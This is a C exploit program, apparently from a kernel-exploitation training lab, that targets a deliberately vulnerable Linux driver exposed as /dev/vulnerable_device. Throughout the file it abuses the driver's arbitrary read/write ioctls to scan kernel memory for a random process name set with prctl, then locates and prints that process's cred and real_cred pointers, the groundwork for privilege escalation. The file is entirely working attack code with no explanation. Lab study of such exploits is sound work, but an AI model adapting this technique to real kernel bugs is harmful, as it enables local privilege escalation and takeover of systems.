#define _GNU_SOURCE  
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <time.h>

#include "../src/vuln_driver.h"
#define BUFF_SIZE 4096
#define START_ADDR 0xffff880000000000

typedef struct init_args {
		size_t size;
	}init_args;

typedef struct realloc_args {
	int grow;
	size_t size;
}realloc_args;

typedef struct read_args {
	char *buff;
	size_t count;
}read_args;

typedef struct seek_args {
	loff_t new_pos;
}seek_args;

typedef struct write_args {
	char *buff;
	size_t count;
}write_args;


int read_mem(int fd, unsigned long addr, char *buff)
{
	seek_args s_args;
	read_args r_args;
	int ret;

	s_args.new_pos = addr - 0x10;
	ret = ioctl(fd, ARBITRARY_RW_SEEK, &s_args);

	r_args.buff = buff;
	r_args.count = BUFF_SIZE;

	ret = ioctl(fd, ARBITRARY_RW_READ, &r_args);

	return ret;

}

void gen_rand_str ( char *str, unsigned int len )
{
    unsigned int i;
    char *alpha = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijlkmnopqrstuvwxyz123456789";
    size_t alpha_len = strlen(alpha);

    for ( i = 0; i < (len - 1); i++ )
        str[i] = alpha[rand() % alpha_len];

    str[len - 1] = 0;
}


int main()
{
	int fd = open("/dev/vulnerable_device", O_RDWR);
	unsigned int ret;
	char *read_buffer = mmap(NULL, BUFF_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0,0);
	char *end_buffer = read_buffer+BUFF_SIZE;
	unsigned long *start_buffer = (unsigned long *)read_buffer;
	unsigned long offset = 0;
	unsigned long k_addr = START_ADDR;
	char comm[16] = {0};
	
	srand(time(NULL));

	gen_rand_str(comm, 16);

	ret = prctl(PR_SET_NAME, comm);

	if(ret < 0)
	{
		printf("error prctl");
		return -1;
	}

	init_args i_args = {
		.size = 1,
	};

	ret = ioctl(fd, ARBITRARY_RW_INIT, &i_args);

	realloc_args r_args = {
		.grow = 0,
		.size = 2,
	};

	ret = ioctl(fd, ARBITRARY_RW_REALLOC, &r_args);
	

	while(1)
	{
		k_addr = START_ADDR + offset;

		if(k_addr < START_ADDR)
		{
			break;
		}
		
		ret = read_mem(fd, k_addr, read_buffer);
		
		//couldnt read at that address
		if(ret != 0)
		{
			offset += BUFF_SIZE;
			continue;
		}

		start_buffer = (unsigned long *)read_buffer;
		
		start_buffer = memmem(start_buffer, BUFF_SIZE, 
            				      comm, sizeof(comm));
            		
            	if(start_buffer != NULL)
            	{	
            		if ( (start_buffer[-2] > START_ADDR) && (start_buffer[-1] > START_ADDR ) )
            		{	
            			unsigned long real_cred = start_buffer[-2], cred = start_buffer[-1];

            			printf("[+] Found comm signature %s at %p [+]\n", start_buffer, (unsigned long *) (k_addr + ((char *)start_buffer - read_buffer)));
            			printf("[+] real_cred: %p [+]\n", real_cred);
            			printf("[+] cred: %p [+]\n", cred);

            			close(fd);
            			exit(0);
            		}
            	}
        
            	offset += BUFF_SIZE;
	}

	
	close(fd);
}